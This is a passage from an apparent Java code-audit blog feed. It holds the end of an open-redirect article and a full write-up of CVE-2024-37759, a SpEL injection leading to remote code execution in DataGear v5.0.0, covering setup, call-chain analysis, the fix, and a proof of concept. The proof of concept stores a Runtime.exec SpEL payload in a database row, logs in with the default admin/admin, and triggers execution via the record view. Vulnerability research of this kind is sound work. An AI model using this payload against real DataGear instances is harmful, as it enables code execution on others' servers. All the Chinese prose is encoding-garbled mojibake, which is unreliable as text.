class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">redirect <br>sendRedirect<br>ModelAndView<br>Location<br>addAttribute â€¦ <br></code></pre></td></tr></table></figure><h3 id="æ¼æ´å±å®³"><a href="#æ¼æ´å±å®³" class="headerlink" title="æ¼æ´å±å®³"></a>æ¼æ´å±å®³</h3><ol><li><p>æ”»å‡»è€…å¯èƒ½ä¼šä½¿ç”¨WebæœåŠ¡å™¨æ”»å‡»å…¶ä»–ç«™ç‚¹ï¼›</p></li><li><p>å¦‚æœå¯¹è¾“å‡ºæ²¡æœ‰åšä¸¥æ ¼é™åˆ¶ï¼Œå°†å¯èƒ½å¯¼è‡´åå°„æ€§XSSæ¼æ´ï¼›</p></li><li><p>é»‘äº§å°†åˆ©ç”¨æ­¤æ¼æ´ï¼Œä»ä¿¡ä»»ç½‘ç«™è·³è½¬åˆ°æ”»å‡»è€…æ„é€ çš„æ¶æ„ç½‘ç«™ç”¨æ¥è¿›è¡Œé’“é±¼ã€è¯ˆéª—ç­‰è¡Œä¸ºï¼›</p></li><li><p>ç»“åˆcsrfæ¼æ´ï¼Œæ”»å‡»è€…å¯é€šè¿‡urlé‡å®šå‘è·å–cookie</p><p><a href="https://blog.csdn.net/qq_43378996/article/details/123910614">CSRFæ¼æ´åŸç†æ”»å‡»ä¸é˜²å¾¡ï¼ˆéå¸¸ç»†ï¼‰-CSDNåšå®¢</a></p></li></ol><h3 id="å®æˆ˜æ¡ˆä¾‹-é»‘ç›’"><a href="#å®æˆ˜æ¡ˆä¾‹-é»‘ç›’" class="headerlink" title="å®æˆ˜æ¡ˆä¾‹(é»‘ç›’)"></a>å®æˆ˜æ¡ˆä¾‹(é»‘ç›’)</h3><p>å‡ºè‡ªï¼š(<a href="https://xz.aliyun.com/news/14506">https://xz.aliyun.com/news/14506</a>)</p><p>è¯¥æ¼æ´åœºæ™¯æ˜¯å¯¹ä¸€ä¸ªè§†é¢‘åˆ†äº«å®ƒä¼šç”Ÿæˆä¸€ä¸ªäºŒç»´ç è·³è½¬åˆ°æˆ‘ä»¬è¦åˆ†äº«çš„è§†é¢‘ï¼Œå¯æˆ‘ä»¬å¯ä»¥åœ¨ç”ŸæˆäºŒç»´ç çš„æ—¶å€™è¿›è¡ŒæŠ“åŒ…å¯¼è‡´urè·³è½¬æ¼æ´ã€‚</p><ol><li>é¦–å…ˆæˆ‘è¿™é‡Œç»™åˆ†äº«è§†é¢‘åœ°å€ç”Ÿæˆçš„äºŒç»´ç </li></ol><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240718133335-46e35650-44c7-1.png"></p><p>è¿™ä¸ªåˆ†äº«äºŒç»´ç çš„urlå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">www.xxx.xxx.com/aiis/h5/pc-client/#/qrcode?url=https%3A%2F%2Fn.com%2Faiis%2FinvestmentAdvisor<br></code></pre></td></tr></table></figure><ol start="2"><li>ä¿®æ”¹è¯¥åœ°å€ä¸º <a href="https://www.baidu.com/">https://www.baidu.com</a> ä¿®æ”¹å®Œæˆåï¼Œåˆ·æ–°è¯¥ç•Œé¢</li></ol><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240718133729-d2eb1be2-44c7-1.png"></p><ol start="3"><li>ç„¶åå°±ç›´æ¥ä½¿ç”¨æˆ‘ä»¬çš„æ‰‹æœºæ‰«æäºŒç»´ç ï¼Œç›´æ¥è·³è½¬åˆ°ä¿®æ”¹çš„åœ°å€</li></ol><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240718135621-753f023a-44ca-1.png"></p><h2 id="æœªå®Œå¾…ç»­"><a href="#æœªå®Œå¾…ç»­" class="headerlink" title="æœªå®Œå¾…ç»­"></a>æœªå®Œå¾…ç»­</h2>]]></content>
    
    
    <categories>
      
      <category>Javaä»£ç å®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Javaä»£ç å®¡è®¡</tag>
      
      <tag>æ¼æ´å­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2024-37759 SpELæ³¨å…¥</title>
    <link href="/2025/07/27/CVE-2024-37759%20SpEL%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/07/27/CVE-2024-37759%20SpEL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h2><p>DataGear æ˜¯ä¸€æ¬¾å¼€æºå…è´¹çš„æ•°æ®å¯è§†åŒ–åˆ†æå¹³å°ï¼Œå…è®¸ç”¨æˆ·è‡ªç”±åˆ¶ä½œæ•°æ®çœ‹æ¿ï¼Œæ”¯æŒæ¥å…¥ SQLã€CSVã€Excelã€HTTP æ¥å£ã€JSON ç­‰å¤šç§æ•°æ®æºã€‚</p><p>DataGear v5.0.0 å­˜åœ¨ SpEL è¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼Œå¯å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><h3 id="æºç ä¸‹è½½"><a href="#æºç ä¸‹è½½" class="headerlink" title="æºç ä¸‹è½½"></a>æºç ä¸‹è½½</h3><p>åœ°å€ï¼š<a href="https://github.com/datageartech/datagear">datageartech&#x2F;datagear: DataGearæ•°æ®å¯è§†åŒ–åˆ†æå¹³å°ï¼Œè‡ªç”±åˆ¶ä½œä»»ä½•æ‚¨æƒ³è¦çš„æ•°æ®çœ‹æ¿ (github.com)</a></p><h3 id="æ•°æ®åº“å‡†å¤‡"><a href="#æ•°æ®åº“å‡†å¤‡" class="headerlink" title="æ•°æ®åº“å‡†å¤‡"></a>æ•°æ®åº“å‡†å¤‡</h3><ol><li>å®‰è£… MySQL 8.0 æ•°æ®åº“ï¼Œå¹¶å°† root ç”¨æˆ·çš„å¯†ç è®¾ç½®ä¸ºï¼šrootï¼ˆæˆ–ä¿®æ”¹ test&#x2F;config&#x2F;jdbc.properties é…ç½®ï¼‰</li><li>æ–°å»ºæµ‹è¯•æ•°æ®åº“ï¼Œåç§°ä¸ºï¼šdg_test</li><li>ä½¿ç”¨ test&#x2F;sql&#x2F;test-mysql.sql è„šæœ¬åˆå§‹åŒ– dg_test åº“</li></ol><h3 id="ç¼–è¯‘è¿è¡Œ"><a href="#ç¼–è¯‘è¿è¡Œ" class="headerlink" title="ç¼–è¯‘è¿è¡Œ"></a>ç¼–è¯‘è¿è¡Œ</h3><p>é¡¹ç›®æ˜¯å…¸å‹çš„ Spring Boot é¡¹ç›®ã€‚åœ¨ IDE ä¸­æ‰“å¼€é¡¹ç›®ï¼Œä½¿ç”¨ Maven ç¼–è¯‘ï¼Œè¿è¡Œ org.datagear.webapp.DataGearApplication å³å¯å¯åŠ¨ã€‚</p><p>é¡¹ç›®å¯åŠ¨åè®¿é—®åœ°å€ï¼š<a href="http://localhost:50401/">http://localhost:50401</a></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="é¡¹ç›®æ¼æ´ç‚¹"><a href="#é¡¹ç›®æ¼æ´ç‚¹" class="headerlink" title="é¡¹ç›®æ¼æ´ç‚¹"></a>é¡¹ç›®æ¼æ´ç‚¹</h3><p>org.datagear.persistence.support.ConversionSqlParamValueMapper#evaluateVariableExpression æ–¹æ³•ä¸­ï¼Œå­˜åœ¨ org.springframework.expression.common.TemplateAwareExpressionParser#parseExpression(java.lang.String) çš„è°ƒç”¨ã€‚</p><p><img src="/img/CVE-2024-37759/C01.png"></p><p>æ­¤æ–¹æ³•ä¸»è¦ç”¨äºè®¡ç®—expressionçš„å€¼</p><p>å¦‚æœå…¶ä¸­çš„å‚æ•° expression å¯æ§ï¼Œè¿™ä¸ªæ¼æ´ç‚¹å°±å¯èƒ½è¢«åˆ©ç”¨ã€‚æ¥ä¸‹æ¥éœ€è¦æ‰¾å‡ºè°ƒç”¨ evaluateVariableExpression çš„åœ°æ–¹ã€‚</p><h3 id="è§¦å‘æ¼æ´ç‚¹çš„è°ƒç”¨é“¾"><a href="#è§¦å‘æ¼æ´ç‚¹çš„è°ƒç”¨é“¾" class="headerlink" title="è§¦å‘æ¼æ´ç‚¹çš„è°ƒç”¨é“¾"></a>è§¦å‘æ¼æ´ç‚¹çš„è°ƒç”¨é“¾</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">org.datagear.web.controller.DataController<span class="hljs-comment">#view</span><br>org.datagear.persistence.support.DefaultPersistenceManager<span class="hljs-comment">#get(java.sql.Connection, org.datagear.persistence.Dialect, org.datagear.meta.Table, org.datagear.persistence.Row, org.datagear.persistence.SqlParamValueMapper, org.datagear.persistence.RowMapper)</span><br>org.datagear.persistence.support.DefaultPersistenceManager<span class="hljs-comment">#buildUniqueRecordCondition</span><br>org.datagear.persistence.support.DefaultPersistenceManager<span class="hljs-comment">#mapToSqlParamValue</span><br>org.datagear.persistence.support.ConversionSqlParamValueMapper<span class="hljs-comment">#map</span><br>org.datagear.persistence.support.ConversionSqlParamValueMapper<span class="hljs-comment">#resolveExpressionIf</span><br>org.datagear.persistence.support.ConversionSqlParamValueMapper<span class="hljs-comment">#evaluateVariableExpressions</span><br></code></pre></td></tr></table></figure><p><img src="/img/CVE-2024-37759/C11.png"></p><h3 id="å¯»æ‰¾è°ƒç”¨é“¾è¿‡ç¨‹"><a href="#å¯»æ‰¾è°ƒç”¨é“¾è¿‡ç¨‹" class="headerlink" title="å¯»æ‰¾è°ƒç”¨é“¾è¿‡ç¨‹"></a>å¯»æ‰¾è°ƒç”¨é“¾è¿‡ç¨‹</h3><p>å…¨å±€æœç´¢evaluateVariableExpressionæ–¹æ³•</p><p>å‘ç°evaluateVariableExpressionsæ–¹æ³•(ä¸»è¦ç”¨äºåˆ¤æ–­è¡¨è¾¾å¼çš„å€¼æ˜¯å¦éœ€è¦è®¡ç®—)ï¼Œè°ƒç”¨æ­¤æ–¹æ³•</p><p>ç»§ç»­è·Ÿè¿›ï¼Œæ‰¾åˆ°resolveExpressionIfæ–¹æ³•è°ƒevaluateVariableExpressionsæ–¹æ³•</p><p><img src="/img/CVE-2024-37759/C02.png"></p><p>aiäº†ä¸€ä¸‹æ­¤æ®µä»£ç å«ä¹‰ï¼Œä¸»è¦æ˜¯ç”¨äºåˆ¤æ–­ä¼ å…¥çš„æ˜¯å¦æœ‰è¡¨è¾¾å¼ï¼Œä¼šå…ˆè®¡ç®—è¡¨è¾¾å¼ï¼Œå†æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­æ‰§è¡Œ</p><p>å¤§è‡´æµç¨‹å›¾</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. å¦‚æœä¸æ˜¯å­—ç¬¦ä¸² â†’ ç›´æ¥è¿”å›<br>2. å¦åˆ™ï¼š<br>   a. å¦‚æœå¯ç”¨å˜é‡è¡¨è¾¾å¼ï¼š<br>       - æå–å¹¶æ±‚å€¼ â†’ æ›¿æ¢ä¸ºç»“æœ<br>       - å¦‚æœæ²¡æœ‰è¡¨è¾¾å¼ä½†æœ‰è½¬ä¹‰å­—ç¬¦ â†’ åè½¬ä¹‰<br>   b. å¦‚æœå¯ç”¨ SQL è¡¨è¾¾å¼ï¼š<br>       - æå–å¹¶æ±‚å€¼ â†’ æ›¿æ¢ä¸ºç»“æœ<br>       - å¦‚æœæ²¡æœ‰è¡¨è¾¾å¼ä½†æœ‰è½¬ä¹‰å­—ç¬¦ â†’ åè½¬ä¹‰<br>3. è¿”å›æœ€ç»ˆå€¼<br></code></pre></td></tr></table></figure><ul><li>è¾“å…¥å€¼ä¸º <code>$&#123;user.name&#125;</code>ï¼Œç³»ç»Ÿä¼šå…ˆæ›¿æ¢ <code>$&#123;user.name&#125;</code> ä¸ºçœŸå®ç”¨æˆ·åå­—ã€‚</li><li>è‹¥æ›¿æ¢åä¸º <code>SELECT COUNT(*) FROM log WHERE user=&#39;å¼ ä¸‰&#39;</code>ï¼Œå†è§£æ <code>#&#123;...&#125;</code> è¡¨è¾¾å¼å¹¶æ‰§è¡Œ SQLã€‚</li><li>å¯åµŒå¥—æ‰§è¡Œï¼Œå…ˆå˜é‡ã€å SQLã€‚</li></ul><p>ç»§ç»­æœç´¢resolveExpressionIfæ–¹æ³•ï¼Œå‘ç°mapæ–¹æ³•è°ƒç”¨æ­¤æ–¹æ³•</p><p><img src="/img/CVE-2024-37759/C03.png"></p><p>æ­¤ä»£ç æ‰§è¡Œæµç¨‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. å¦‚æœå€¼ä¸º nullï¼Œç›´æ¥è¿”å› null å‚æ•°å°è£…<br>2. å¦åˆ™ï¼š<br>   a. æ‰§è¡Œè¡¨è¾¾å¼è§£æï¼ˆå˜é‡ / SQL è¡¨è¾¾å¼ï¼‰<br>   b. å¦‚æœè§£æåæ˜¯ SqlParamValue ç±»å‹ â†’ ç›´æ¥è¿”å›<br>   c. å¦åˆ™å°†å€¼å°è£…ä¸º SqlParamValue<br>3. æ•è·å¼‚å¸¸ï¼š<br>   a. æ˜ å°„å¼‚å¸¸åŸæ ·æŠ›å‡º<br>   b. å…¶ä»–å¼‚å¸¸å°è£…å¹¶æŠ›å‡ºï¼ˆå«è¡¨ã€åˆ—ã€å€¼ä¿¡æ¯ï¼‰<br></code></pre></td></tr></table></figure><p>ä¸»è¦ç”¨äºå°†ä¸€ä¸ªåŸå§‹å€¼ï¼ˆå¯èƒ½æ˜¯è¡¨è¾¾å¼ï¼‰è½¬æ¢ä¸º <code>SqlParamValue</code> ç±»å‹ï¼Œç”¨äºæ•°æ®åº“æ“ä½œã€‚</p><p>ç»§ç»­æŸ¥æ‰¾ç”¨æ³•ï¼Œå‘ç°org&#x2F;datagear&#x2F;persistence&#x2F;support&#x2F;DefaultPersistenceManager.java</p><p>mapToSqlParamValueæ–¹æ³•ä¸­è°ƒç”¨äº†mapæ–¹æ³•</p><p><img src="/img/CVE-2024-37759/C04.png"></p><p>æå–å‡ºå…³é”®ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (mapper == <span class="hljs-literal">null</span>)<br>    sqlParamValue = createSqlParamValue(column, value);<br><span class="hljs-keyword">else</span><br>    sqlParamValue = mapper.map(cn, table, column, value);<br></code></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰ä¼ å…¥ <code>mapper</code>ï¼Œä½¿ç”¨é»˜è®¤çš„æ–¹å¼åˆ›å»º <code>SqlParamValue</code>ï¼›</p><p>å¦åˆ™ï¼Œè°ƒç”¨å¤–éƒ¨æä¾›çš„ <code>mapper</code> çš„ <code>map()</code> æ–¹æ³•æ‰§è¡Œè‡ªå®šä¹‰æ˜ å°„ã€‚</p><p>è¿™é‡Œåº”è¯¥æ§åˆ¶ä¼ å…¥mapperä¸ºConversionSqlParamValueMapperæ‰å¯è°ƒç”¨æˆ‘ä»¬éœ€è¦çš„mapæ–¹æ³•</p><p>ç»§ç»­æŸ¥æ‰¾ç”¨æ³•ï¼Œæ¥åˆ°çš„buildUniqueRecordConditionæ–¹æ³•</p><p><img src="/img/CVE-2024-37759/C05.png"></p><p>æ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šçš„æ¡ä»¶</p><p>æ­¤æ–¹æ³•ç”¨é€”</p><table><thead><tr><th>åŠŸèƒ½</th><th>æè¿°</th></tr></thead><tbody><tr><td>æ„é€  SQL æ¡ä»¶</td><td>åŸºäºå”¯ä¸€åˆ—ç”Ÿæˆç²¾ç¡®åŒ¹é…æ¡ä»¶</td></tr><tr><td>æ”¯æŒ null å€¼å¤„ç†</td><td>è‡ªåŠ¨ä½¿ç”¨ <code>IS NULL</code></td></tr><tr><td>æ”¯æŒåµŒå¥— SQL</td><td>å¯¹å­—é¢é‡ SQL åšåˆæ³•æ€§æ ¡éªŒ</td></tr><tr><td>å®‰å…¨</td><td>å€¼é€šè¿‡å‚æ•°ç»‘å®šï¼Œé¿å… SQL æ³¨å…¥</td></tr></tbody></table><p>ç”Ÿæˆ SQL ç¤ºä¾‹</p><p>å‡è®¾å”¯ä¸€å­—æ®µä¸º <code>id, name</code>ï¼Œå¯¹åº”æ•°æ®ä¸ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">id = <span class="hljs-number">1001</span><br>name = <span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>ç”Ÿæˆçš„ SQL æ¡ä»¶å°†ä¸ºï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id <span class="hljs-operator">=</span> ? <span class="hljs-keyword">AND</span> name <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span><br></code></pre></td></tr></table></figure><p>ç»‘å®šå‚æ•°åˆ—è¡¨ä¸ºï¼š<code>[1001]</code></p><p>ç»§ç»­è·Ÿè¿›ï¼Œçœ‹åˆ°getæ–¹æ³•è°ƒç”¨æ­¤æ–¹æ³•</p><p><img src="/img/CVE-2024-37759/C06.png"></p><p>æ‰§è¡Œæµç¨‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. æ£€æŸ¥è¡¨åˆæ³•æ€§<br>2. è·å–æ•°æ®åº“æ–¹è¨€<br>3. åˆ›å»º SQL æŸ¥è¯¢è¯­å¥ï¼ˆSELECT * FROM ... WHERE ...ï¼‰<br>4. å°†å”¯ä¸€å­—æ®µä» param æ˜ å°„ä¸º SQL æ¡ä»¶<br>5. æ‰§è¡ŒæŸ¥è¯¢ï¼Œç»“æœæ˜ å°„ä¸º Row åˆ—è¡¨<br>6. åˆ¤æ–­è¿”å›ç»“æœæ•°é‡ï¼š<br>   - 1 æ¡ â†’ è¿”å›<br>   - 0 æ¡ â†’ null<br>   - &gt;1 æ¡ â†’ æŠ›å‡º NonUniqueResultException<br>7. æœ€ç»ˆé‡Šæ”¾èµ„æº<br></code></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼Œä½ è¦ä» <code>user</code> è¡¨ä¸­æ ¹æ® <code>id=1001</code> æŸ¥è¯¢ä¸€ä¸ªç”¨æˆ·ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Row</span> <span class="hljs-variable">row</span> <span class="hljs-operator">=</span> get(cn, <span class="hljs-literal">null</span>, userTable, Row.of(<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-number">1001</span>), defaultMapper, rowMapper);<br></code></pre></td></tr></table></figure><p>è¿”å›ç»“æœå¯èƒ½æ˜¯ï¼š</p><ul><li>æ‰¾åˆ°å”¯ä¸€ç”¨æˆ· â†’ è¿”å› <code>Row</code> å¯¹è±¡</li><li>æ²¡æœ‰è¯¥ç”¨æˆ· â†’ è¿”å› <code>null</code></li><li>id å­—æ®µä¸æ˜¯å”¯ä¸€çš„ï¼ˆå¼‚å¸¸ï¼‰â†’ æŠ›å‡º <code>NonUniqueResultException</code></li></ul><p>ç»§ç»­æŸ¥æ‰¾åˆ©ç”¨ç‚¹</p><p>æ¥åˆ°org&#x2F;datagear&#x2F;web&#x2F;controller&#x2F;DataController.java </p><p>viewæ–¹æ³•</p><p><img src="/img/CVE-2024-37759/C07.png"></p><p>å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†persistenceManager.get</p><p>org.datagear.web.controller.DataController#view æ˜¯æŸ¥çœ‹æ•°æ®åº“è¡¨ä¸­ä¸€æ¡è®°å½•çš„å…¥å£æ–¹æ³•ã€‚å…¶é€»è¾‘æ˜¯æ ¹æ®ä¼ å…¥çš„å‚æ•°æŸ¥è¯¢è¡¨ï¼Œå³ SELECT * FROM table WHERE paramName &#x3D; paramValueã€‚</p><p>ä½†åœ¨æ„é€ è¿™ä¸ª SQL æŸ¥è¯¢è¯­å¥æ—¶ï¼Œä¼šå¯¹ paramValue è¿›è¡Œå¤„ç†ã€‚å®ƒä¼šæ ¹æ®æ˜¯å¦åŒ…å« â€œ#{â€œ ç­‰ç‰¹æ®Šå­—ç¬¦æ¥åˆ¤æ–­æ˜¯å¦ä¸ºè¡¨è¾¾å¼ã€‚å¦‚æœæ˜¯è¡¨è¾¾å¼ï¼Œå°±ä¼šè¿›è¡Œè®¡ç®—åå†æ‹¼æ¥åˆ° SQL ä¸­ã€‚ï¼ˆè¿™ä¸ªé€»è¾‘åœ¨ org.datagear.persistence.support.ConversionSqlParamValueMapper#resolveExpressionIf ä¸­ï¼‰æ­¤å¤–ï¼Œè¿˜éœ€è¦ ConversionSqlParamValueMapper å¯ç”¨å˜é‡è¡¨è¾¾å¼ç‰¹æ€§ã€‚</p><p>æ„é€ çš„æ¶æ„æ•°æ®åº“ï¼ˆå…·ä½“è§æ¼æ´å¤ç°ï¼‰å°±æ˜¯åˆ©ç”¨è¿™ä¸ªé€»è¾‘ï¼Œä¼ å…¥å‚æ•° {â€œnameâ€:â€#{T(java.lang.String).forName(â€˜java.lang.Runtimeâ€™).getRuntime().exec(â€˜calcâ€™)}â€}ã€‚å…¶ä¸­çš„ #{T(java.lang.String).forName(â€˜java.lang.Runtimeâ€™).getRuntime().exec(â€˜calcâ€™)} ç¬¦åˆè¡¨è¾¾å¼å½¢å¼ï¼Œä¼šè¿›å…¥ parseExpression è¿›è¡Œè®¡ç®—ï¼Œä»è€Œè§¦å‘å‘½ä»¤æ‰§è¡Œã€‚</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><h3 id="ç¬¬ä¸€æ­¥ï¼šå‡†å¤‡æ¶æ„æ•°æ®åº“è¡¨"><a href="#ç¬¬ä¸€æ­¥ï¼šå‡†å¤‡æ¶æ„æ•°æ®åº“è¡¨" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šå‡†å¤‡æ¶æ„æ•°æ®åº“è¡¨"></a>ç¬¬ä¸€æ­¥ï¼šå‡†å¤‡æ¶æ„æ•°æ®åº“è¡¨</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> DATABASE evil;<br><br><span class="hljs-keyword">CREATE TABLE</span> `evil` (<br>  `name` <span class="hljs-type">varchar</span>(<span class="hljs-number">209</span>) <span class="hljs-keyword">COLLATE</span> utf8mb4_unicode_ci <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span><br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8mb4_unicode_ci;<br><br><span class="hljs-keyword">INSERT INTO</span> `evil` <span class="hljs-keyword">VALUES</span> (&quot;#&#123;T(java.lang.String).forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&#125;&quot;);<br></code></pre></td></tr></table></figure><p><img src="/img/CVE-2024-37759/C08.png"></p><h3 id="ç¬¬äºŒæ­¥ï¼šæ·»åŠ æ¶æ„æ•°æ®åº“æº"><a href="#ç¬¬äºŒæ­¥ï¼šæ·»åŠ æ¶æ„æ•°æ®åº“æº" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šæ·»åŠ æ¶æ„æ•°æ®åº“æº"></a>ç¬¬äºŒæ­¥ï¼šæ·»åŠ æ¶æ„æ•°æ®åº“æº</h3><ol><li>ç™»å½• <a href="http://localhost:50401/">http://localhost:50401</a>ï¼Œé»˜è®¤è´¦å·å¯†ç ä¸º admin&#x2F;adminã€‚</li><li>åœ¨æ¶æ„æ·»åŠ ç•Œé¢ä¸­æ·»åŠ æ­¤ MySQL æ•°æ®åº“ï¼š<code>/schema/saveAdd</code>ã€‚</li><li>é€‰æ‹©â€æ•°æ®æºâ€â€”â€œæ•°æ®æºæ·»åŠ â€ï¼Œå¡«å†™åˆšæ‰åˆ›å»ºçš„æ¶æ„æ•°æ®åº“åœ°å€ã€‚</li></ol><p><img src="/img/CVE-2024-37759/C09.png"></p><h3 id="ç¬¬ä¸‰æ­¥ï¼šè§¦å‘æ¼æ´æ‰§è¡Œä»£ç "><a href="#ç¬¬ä¸‰æ­¥ï¼šè§¦å‘æ¼æ´æ‰§è¡Œä»£ç " class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šè§¦å‘æ¼æ´æ‰§è¡Œä»£ç "></a>ç¬¬ä¸‰æ­¥ï¼šè§¦å‘æ¼æ´æ‰§è¡Œä»£ç </h3><p>æ‰“å¼€åˆšæ‰æ·»åŠ çš„æ•°æ®åº“ï¼Œç„¶åå•å‡»â€æŸ¥çœ‹â€æŒ‰é’®ï¼Œå°†æ‰§è¡Œ SpEL è¡¨è¾¾å¼</p><p><img src="/img/CVE-2024-37759/C10.png"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>DataGear åœ¨ v5.1.0 ä¸­ä¿®å¤äº†è¿™ä¸ªæ¼æ´ã€‚</p><p>ä¿®å¤æ–¹æ¡ˆåˆ©ç”¨äº†å‰é¢æåˆ°çš„ ConversionSqlParamValueMapper ä¸­çš„å˜é‡è¡¨è¾¾å¼ç‰¹æ€§ã€‚æ–°çš„é€»è¾‘ç›´æ¥å…³é—­äº†è¿™ä¸ªç‰¹æ€§ï¼Œå…¨éƒ¨æŒ‰ç…§å­—ç¬¦ä¸²å¤„ç†ï¼Œä¸å†å¯¹è¡¨è¾¾å¼è¿›è¡Œè§£æã€‚</p><p>æ³¨ï¼šå¯ä»¥ä½¿ç”¨ SimpleEvaluationContext æ¥é™åˆ¶å¯æ‰§è¡Œæ³¨å…¥çš„ SpEL è¡¨è¾¾å¼ã€‚</p><p>åˆ›å»ºä¸€ä¸ª å—é™çš„è¡¨è¾¾å¼æ‰§è¡Œç¯å¢ƒï¼Œé»˜è®¤ï¼š</p><ul><li>åªå…è®¸è¯»å–å±æ€§ã€è°ƒç”¨ getter æ–¹æ³•</li><li>ä¸å…è®¸è°ƒç”¨ä»»æ„æ–¹æ³•ï¼ˆå¦‚ <code>System.exit()</code> è¿™ç§å±é™©æ“ä½œï¼‰</li><li>é€‚åˆæš´éœ²ç»™ä¸å¯ä¿¡çš„ç”¨æˆ·è¾“å…¥ï¼ˆå®‰å…¨ï¼‰</li></ul><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://forum.butian.net/article/590">https://forum.butian.net/article/590</a></p>]]></content>
    
    
    <categories>
      
      <category>Javaä»£ç å®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Javaä»£ç å®¡è®¡</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaä»£ç å®¡è®¡ä¸­çš„SSRF</title>
    <link href="/2025/07/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84SSRF/"/>
    <url>/2025/07/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84SSRF/</url>
    
